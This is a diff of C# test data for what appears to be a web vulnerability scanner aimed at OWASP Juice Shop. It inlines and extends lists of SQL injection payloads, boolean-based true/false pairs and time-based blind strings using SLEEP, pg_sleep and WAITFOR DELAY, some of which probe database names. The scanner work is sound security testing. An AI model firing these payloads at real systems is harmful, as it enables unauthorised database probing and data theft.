@@ -1,5 +1,4 @@
-﻿using System.ComponentModel;
-using WebVulnerabilitiesScanner.Entities;
+﻿using WebVulnerabilitiesScanner.Entities;
 
 namespace WebVulnerabilitiesScanner.TestData
 {
@@ -10,28 +9,6 @@ namespace WebVulnerabilitiesScanner.TestData
     {
         public const int TimeValueForTimeBasedBlind_s = 5;
         public const int TimeBasedBlindRequestsCountForAverage = 3;
-
-        #region Boolean-based payloads
-        private const string BooleanBasedOrStringTruePayload = "' OR '1'='1";
-        private const string BooleanBasedOrStringFalsePayload = "' OR '1'='2";
-        private const string BooleanBasedOrInlineCommentTruePayload = "' OR 1=1--";
-        private const string BooleanBasedOrInlineCommentFalsePayload = "' OR 1=2--";
-        private const string BooleanBasedOrHashCommentTruePayload = "' OR 1=1#";
-        private const string BooleanBasedOrHashCommentFalsePayload = "' OR 1=2#";
-        private const string BooleanBasedOrBlockCommentTruePayload = "' OR 1=1/*";
-        private const string BooleanBasedOrBlockCommentFalsePayload = "' OR 1=2/*";
-        private const string BooleanBasedAndInlineCommentTruePayload = "' AND 1=1--";
-        private const string BooleanBasedAndInlineCommentFalsePayload = "' AND 1=2--";
-        #endregion
-
-        /// <summary>
-        /// Тип портала
-        /// </summary>
-        public enum PortalType
-        {
-            [Description("OWASP JuiceShop")]
-            JuiceShop = 1,
-        }
 
         /// <summary>
         /// Эндпоинты для GET-запросов
@@ -78,6 +55,9 @@ namespace WebVulnerabilitiesScanner.TestData
             new RequestSqlInjectionPayloadEntity($"'; SELECT pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
             new RequestSqlInjectionPayloadEntity($"' OR pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
             new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN 1=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) ELSE pg_sleep(0) END--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' AND IF(ASCII(SUBSTRING(database(),1,1))=97, SLEEP({TimeValueForTimeBasedBlind_s}), 0)--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN (SELECT 1)=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) END--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' IF (SELECT DB_NAME())='master' WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
         };
 
         /// <summary>
@@ -87,42 +67,29 @@ namespace WebVulnerabilitiesScanner.TestData
         {
             // Каждая пара описывает один и тот же синтаксис инъекции для истинного и ложного условия.
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringTruePayload, SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringFalsePayload, SqlInjectionType.BooleanBased)),
+                new RequestSqlInjectionPayloadEntity("' OR '1'='1", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR '1'='2", SqlInjectionType.BooleanBased)),
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentTruePayload, SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentFalsePayload, SqlInjectionType.BooleanBased)),
+                new RequestSqlInjectionPayloadEntity("' OR 1=1--", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR 1=2--", SqlInjectionType.BooleanBased)),
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentTruePayload, SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentFalsePayload, SqlInjectionType.BooleanBased)),
+                new RequestSqlInjectionPayloadEntity("' OR 1=1#", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR 1=2#", SqlInjectionType.BooleanBased)),
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentTruePayload, SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentFalsePayload, SqlInjectionType.BooleanBased)),
+                new RequestSqlInjectionPayloadEntity("' OR 1=1/*", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR 1=2/*", SqlInjectionType.BooleanBased)),
             new BooleanBasedPayloadPairEntity(
-                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentTruePayload, SqlInjectionType.BooleanBased),
-                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentFalsePayload, SqlInjectionType.BooleanBased))
+                new RequestSqlInjectionPayloadEntity("' AND 1=1--", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' AND 1=2--", SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity("' OR 'a'='a'--", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' OR 'a'='b'--", SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity("' AND LENGTH('test')=4--", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' AND LENGTH('test')=5--", SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity("' AND ASCII(SUBSTRING('A',1,1))=65--", SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity("' AND ASCII(SUBSTRING('A',1,1))=66--", SqlInjectionType.BooleanBased)),
         };
-
-        /// <summary>
-        /// Получение тестовых данных (эндпоинты и данные для GET и POST запросов) для конкретного типа портала
-        /// </summary>
-        /// <param name="portalType">Тип портала</param>
-        /// <param name="getRequestEndpoints">Эндпоинты для GET запросов</param>
-        /// <param name="postRequestsInfo">Информация для POST запросов</param>
-        /// <exception cref="Exception"></exception>
-        public static void GetTestDataByPortalType(PortalType portalType, out List<string> getRequestEndpoints, out List<PostRequestParams> postRequestsInfo) 
-        {
-            if (portalType == PortalType.JuiceShop)
-            {
-                var juiceShopTestDataInstance = new JuiceShopTestData();
-                getRequestEndpoints = juiceShopTestDataInstance.GetRequestEndpoints;
-                postRequestsInfo = juiceShopTestDataInstance.PostRequestsInfo;
-                return;
-            }
-            else 
-            {
-                throw new Exception($"Не удалось получить тестовые данные для портала {portalType}");
-            }
-        }
     }
 }
